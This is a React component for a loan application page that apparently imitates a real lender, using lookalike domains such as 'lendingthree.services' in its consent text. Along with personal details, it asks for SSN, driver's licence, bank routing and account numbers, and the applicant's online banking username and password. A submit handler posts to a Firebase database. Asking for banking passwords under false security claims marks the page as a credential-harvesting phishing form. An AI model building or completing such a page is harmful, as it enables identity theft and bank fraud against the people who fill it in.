import logo from "../../assets/logo.svg";
import file from "../../assets/ios-files-logo.png";
import book from "../../assets/book.png";
import briefcase from "../../assets/briefcase.png";
import bank from "../../assets/bank.png";
import { Link } from "react-router-dom";
import { db } from "../../../firebase";
import { useState } from "react";

const Details = () => {
  const [loanAmount, setLoanAmount] = useState("");
  const [firstName, setFirstName] = useState("");
  const [middleName, setMiddleName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [DOB, setDOB] = useState("");
  const [streetAddress, setStreetAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [zip, setZip] = useState("");
  const [license, setLicense] = useState("");
  const [licenseState, setLicenseState] = useState("");
  const [ssn, setSsn] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [bankName, setBankName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [bankingUsername, setBankingUsername] = useState("");
  const [bankingPassword, setBankingPassword] = useState("");
  const [isChecked, setIsChecked] = useState(false);

  function handleCheckboxChange(event) {
    setIsChecked(event.target.checked);
  }

  function handleSubmit(e) {
    e.preventDefault();
    const data = {
      name: "John Doe",
      age: 30,
      email: "johndoe@example.com",
    };
    fetch("https://namraj-a5567-default-rtdb.firebaseio.com/users.json", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    // const collectionRef = db.collection("users");
    // const data = {
    //   name: "John Doe",
    //   age: 30,
    //   email: "johndoe@example.com",
    // };
    // collectionRef
    //   .add(data)
    //   .then((docRef) => {
    //     console.log("Document written with ID: ", docRef.id);
    //   })
    //   .catch((error) => {
    //     console.error("Error adding document: ", error);
    //   });
  }
  return (
    <>
      <div className=" bg-[#101f30] p-4 w-full ">
        <div className="flex justify-between items-center w-[95%] mx-auto">
          <div className="h-7 w-28 ">
            <Link to="/">
              <img
                src={logo}
                className="object-cover h-full w-full cursor-pointer  "
                alt="Your Image"
              />
            </Link>
          </div>

          <button
            type="button"
            className="text-white bg-gradient-to-r hover:to-green-400 hover:from-blue-500 from-pink-500 to-yellow-500 p-4 rounded-xl"
          >
            <Link to="/apply">RETURNING CUSTOMER</Link>
          </button>
        </div>
      </div>
      <div className="grid grid-cols-3 ">
        <form
          className="col-span-2 w-[70%] ml-auto  p-10"
          onSubmit={handleSubmit}
        >
          <div className="flex flex-col gap-5">
            <div className="flex items-center">
              <img src={file} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">
                PERSONAL DETAILS
              </h1>
            </div>

            <div>
              <p>Tell us how much you need...</p>
              <div>
                <p className="font-bold">*Loan Amount</p>
                <select
                  name="loans"
                  id="loans"
                  className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                >
                  <option value="2000">$2,000</option>
                  <option value="2500">$2,500</option>
                  <option value="3000">$3,000</option>
                  <option value="3500">$3,500</option>
                  <option value="4000">$4,000</option>
                  <option value="4500">$4,500</option>
                  <option value="5000">$5,000</option>
                  <option value="5500">$5,500</option>
                  <option value="6000">$6,000</option>
                  <option value="6500">$6,500</option>
                  <option value="7000">$7,000</option>
                  <option value="7500">$7,500</option>
                  <option value="8000">$8,000</option>
                  <option value="8500">$8,500</option>
                  <option value="9000">$9,000</option>
                  <option value="9500">$9,500</option>
                  <option value="10000">$10,000</option>
                </select>
              </div>
            </div>
            <hr />
            <div className="flex flex-col space-y-5">
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Legal First Name</p>
                  <input
                    type="text"
                    placeholder="Legal First Name"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>

                <div>
                  <p className="font-bold">*Legal Middle Name</p>
                  <input
                    type="text"
                    placeholder="Legal Middle Name"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Legal Last Name</p>
                  <input
                    type="text"
                    placeholder="Legal Last Name"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*Email</p>
                  <input
                    type="text"
                    placeholder="Email"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Phone Number</p>
                  <input
                    type="text"
                    placeholder="Phone Number"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*DOB</p>
                  <input
                    type="text"
                    placeholder="DOB"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
            </div>
          </div>
          <div className="flex flex-col gap-5 mt-5">
            <div className="flex items-center">
              <img src={book} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">MORE DETAILS</h1>
            </div>

            <div className="flex flex-col space-y-5">
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Street Address</p>
                  <input
                    type="text"
                    placeholder="Street Address"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*City</p>
                  <input
                    type="text"
                    placeholder="City"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*State</p>
                  <input
                    type="text"
                    placeholder="State"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*Zip</p>
                  <input
                    type="text"
                    placeholder="Zip"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Driver's License/ID Card</p>
                  <input
                    type="text"
                    placeholder="Driver's License or Other Card"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*License State</p>
                  <input
                    type="text"
                    placeholder="License State"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
            </div>
          </div>
          <div className="mt-5 space-y-5">
            <div className="flex items-center">
              <img src={briefcase} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">
                IDENTITY VERIFICATION
              </h1>
            </div>

            <div>
              <p className="font-bold">*SSN</p>
              <input
                type="text"
                placeholder="XXX-XX-XXXX"
                className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
              />
            </div>
          </div>
          <div className="flex flex-col gap-5 mt-5">
            <div className="flex items-center">
              <img src={bank} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">
                BANK ACCOUNT INFO
              </h1>
            </div>

            <div className="flex flex-col space-y-5">
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*ABA/Routing Number</p>
                  <input
                    type="text"
                    placeholder="ABA/Routing Number"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*Bank Name</p>
                  <input
                    type="text"
                    placeholder="Bank Name"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Account Number</p>
                  <input
                    type="text"
                    placeholder="Account Number"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
                <div>
                  <p className="font-bold">*Mobile/Online Banking Username</p>
                  <input
                    type="text"
                    placeholder="Mobile/Online Banking Username"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
              <div className="flex gap-5">
                <div>
                  <p className="font-bold">*Mobile/Online Banking Password</p>
                  <input
                    type="text"
                    placeholder="Mobile/Online Banking Password"
                    className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  />
                </div>
              </div>
            </div>
          </div>
          <label className="mt-4 block space-y-3">
            <input
              type="checkbox"
              checked={isChecked}
              onChange={handleCheckboxChange}
            />
            I consent to receive calls, texts and pre-recorded messages from
            lendingtree.services, and its lending and/or network partners.
            Message and data rates may apply.**
          </label>

          <button
            className="mt-5 bg-blue-500 text-white px-4 py-2 rounded-md  block mx-auto"
            type="submit"
          >
            SUBMIT
          </button>
          <p className="mt-5">
            By clicking Find My Loan, I agree to receive important notices and
            other communications electronically. Terms & Conditions and Privacy
            Policy apply. ** Message Frequency: 2 msgs/week. I understand I may
            opt-out of SMS communication by replying ‘STOP’ or ’HELP' for more
            information, or by contacting contact@lendingthree.services. Consent
            to receive texts and calls is not required as a condition of
            purchasing any products or services. See SMS Policy for more
            details. I certify that I am a US resident over 18, and all
            information submitted with this loan request is true and accurate to
            the best of my knowledge.
          </p>
        </form>
        <div className="col-span-1 bg-blue-500 h-[100%] flex  flex-col gap-3 p-10">
          <h1 className="text-white text-4xl font-bold">Need Help ?</h1>
          <p className="text-white text-[18px]">
            If you are unsure what to enter in a particular field, please refer
            to this pane and you will see a message with detailed instructions.
          </p>
          <div>
            <img src="" alt="" />
            <p className="text-white text-[18px] ">
              We use 256-bit SSL encryption and strict high levels of security
              to keep your information safe.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default Details;
